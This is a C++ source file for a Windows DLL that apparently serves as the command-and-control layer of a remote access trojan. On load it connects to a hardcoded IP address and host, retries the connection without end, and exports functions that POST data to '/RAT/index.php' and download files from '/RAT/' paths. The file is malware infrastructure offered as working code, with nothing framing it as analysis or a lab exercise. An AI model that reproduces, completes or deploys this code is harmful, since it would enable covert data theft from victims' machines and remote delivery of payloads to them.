//cl /EHsc /LD .\network_lib.cpp /link ws2_32.lib /OUT:network_lib.dll
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <mutex>
#include <vector>
#define WIN32_LEAN_AND_MEAN

#define ADDR "103.92.235.21"
#define H_NAME "Host: arth.imbeddex.com\r\n"
#define PRT 80

SOCKET clientSocket = INVALID_SOCKET;
std::mutex socketMutex;

int safe_closesocket()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        return 0;
    }
    return 1;
}

int socket_setup()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PRT);
    serverAddr.sin_addr.s_addr = inet_addr(ADDR);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Connection failed with error: " << error << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 0;
    }
    return 1;
}

bool reconnect()
{
    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);

    if(!socket_setup()) return false;
    else return true;

}

__declspec(dllexport) int send_data(const std::string& filename, const std::string& data)
{
    std::lock_guard<std::mutex> lock(socketMutex);

    try {
        std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
                                    H_NAME
                                    "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
                                    "Content-Type: application/octet-stream\r\n"
                                    "Connection: keep-alive\r\n\r\n" +
                                    filename + data;
        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            std::cerr << "Send failed with error: " << error << std::endl;
            throw std::runtime_error("Send failed");
        }

        char buffer[4096];
        int bytesReceived;
        std::string response;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0)
            {
                buffer[bytesReceived] = '\0';
                response += buffer;
            }
            else if (bytesReceived == 0)
            {
                //std::cout << "Connection closed by server." << std::endl;
                break;
            }
            else
            {
                int error = WSAGetLastError();
                std::cerr << "Receive failed with error: " << error << std::endl;
                throw std::runtime_error("Receive failed");
            }
        } while (bytesReceived == sizeof(buffer) - 1);
        
        return 0;
    }
    catch (const std::exception& e)
    {
        std::cerr << "Exception in send_data: " << e.what() << std::endl;
        return 1;
    }
}

__declspec(dllexport) std::string receive_data(const std::string& filename)
{

    bool connected = TRUE;

    std::unique_lock<std::mutex> lock(socketMutex);
    while (connected)
    {
        try
        {
            std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
            H_NAME
            "Connection: Keep-Alive\r\n\r\n";
            int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
            
            if (bytesSent == SOCKET_ERROR)
            {
            int error = WSAGetLastError();
            std::cerr << "Send failed with error: " << error << std::endl;
            throw std::runtime_error("Send failed");
            }

            char buffer[4096];
            std::string receivedData;
            int bytesReceived;

            do
            {
                bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if (bytesReceived > 0)
                {
                    buffer[bytesReceived] = '\0';
                    receivedData += buffer;
                }
                else if (bytesReceived == 0)
                {
                    std::cout << "Connection closed by server." << std::endl; connected = FALSE;

                    lock.unlock();
                    while (!reconnect())
                    {
                        std::cerr << "Reconnection failed. Retrying in 2 seconds..." << std::endl;
                        Sleep(2000);
                    } std::cerr << "Reconnection successful. Retrying request..." << std::endl;
                    
                    connected = TRUE;
                    lock.lock();
                    continue;
                }
                else
                {
                    int error = WSAGetLastError();
                    if (error != WSAECONNRESET)
                    {
                    std::cerr << "Receive failed with error: " << error << std::endl;
                    throw std::runtime_error("Receive failed.");
                    }
                }

            } while (bytesReceived == sizeof(buffer) - 1);

            size_t headerEnd = receivedData.find("\r\n\r\n");
            if (headerEnd == std::string::npos)
            {
                std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
                throw std::runtime_error("Invalid HTTP response: No header/body separator found.");
            }

            std::string body = receivedData.substr(headerEnd + 4);

            size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
            if (transferEncodingPos != std::string::npos)
            {
                std::string unchunkedBody;
                const char* ptr = body.c_str();
                const char* end = ptr + body.length();

                while (ptr < end)
                {
                    while (ptr < end && (*ptr == ' ' || *ptr == '\r' || *ptr == '\n')) ++ptr;

                    if (ptr >= end) break;

                    size_t chunkSize = 0;
                    while (ptr < end && isxdigit(*ptr))
                    {
                        chunkSize *= 16;
                        chunkSize += isdigit(*ptr) ? *ptr - '0' : (tolower(*ptr) - 'a' + 10);
                        ++ptr;
                    }

                    while (ptr < end && (*ptr == '\r' || *ptr == '\n')) ++ptr;

                    if (chunkSize == 0 || ptr + chunkSize > end) break;

                    unchunkedBody.append(ptr, chunkSize);
                    ptr += chunkSize;
                }

                body = unchunkedBody;
            }
            return body;
        }
        catch (const std::exception& e)
        {
            std::cerr << "Attempt failed: " << e.what() << std::endl;
        }
    }
    
    return "";
}


__declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
{
    std::lock_guard<std::mutex> lock1(socketMutex);

    SOCKET TempSocket = INVALID_SOCKET;
    try
    {
        TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TempSocket == INVALID_SOCKET)
        {
            std::cerr << "Socket creation failed.\n";
            WSACleanup();
            throw std::runtime_error("Socket creation failed");
        }

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(PRT);
        serverAddr.sin_addr.s_addr = inet_addr(ADDR);

        while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED) std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }

        // Send HTTP GET request
        std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
        httpRequest += H_NAME;
        httpRequest += "Connection: close\r\n\r\n";

        int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            std::cerr << "Send failed with error: " << error << std::endl;
            throw std::runtime_error("Send failed");
        }

        // Receive data in chunks
        char buffer[8192];
        std::vector<unsigned char> receivedData;
        int bytesReceived;

        do
        {
            bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
            else if (bytesReceived == 0)
            {
                //std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
                break;
            }
            else
            {
                int error = WSAGetLastError();
                std::cerr << "Receive failed with error: " << error << std::endl;
                break;
            }
        } while (bytesReceived > 0);

        try
        {
            // Ensure header separator is found
            size_t headerEnd = 0;
            const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

            // Search for header separator (CRLF + CRLF)
            for (size_t i = 0; i < receivedData.size() - 3; ++i)
            {
                if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
                {
                    headerEnd = i + 4; // Found header, skip the separator
                    break;
                }
            }

            if (headerEnd == 0)
            {
                std::cerr << "Header separator not found." << std::endl;
                throw std::runtime_error("Header separator not found");
            }

            if (headerEnd < receivedData.size())
            {
                std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());      
                return body;
            }
            else
            {
                std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
                throw std::runtime_error("Body extraction failed");
            }
        }
        catch (...)
        {
            if (TempSocket != INVALID_SOCKET)
            {
                shutdown(TempSocket, SD_BOTH);
                closesocket(TempSocket);
                TempSocket = INVALID_SOCKET;
            }
            throw;
        }
        
    }
    catch (const std::exception& e)
    {
        std::cerr << "Exception in receive_data_raw: " << e.what() << std::endl;
    }

    return std::vector<unsigned char>();
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            while (!socket_setup())
            {
                std::cerr << "Connection failed. Retrying in 2 seconds..." << std::endl;
                Sleep(2000);
            }
        break;

        case DLL_PROCESS_DETACH:
            safe_closesocket();
            WSACleanup();
        break;

        case DLL_THREAD_ATTACH:
            while (!socket_setup())
            {
                std::cerr << "Connection failed. Retrying in 2 seconds..." << std::endl;
                Sleep(2000);
            }
        break;

        case DLL_THREAD_DETACH:
            safe_closesocket();
            WSACleanup();
        break;
    }
    return TRUE;
}
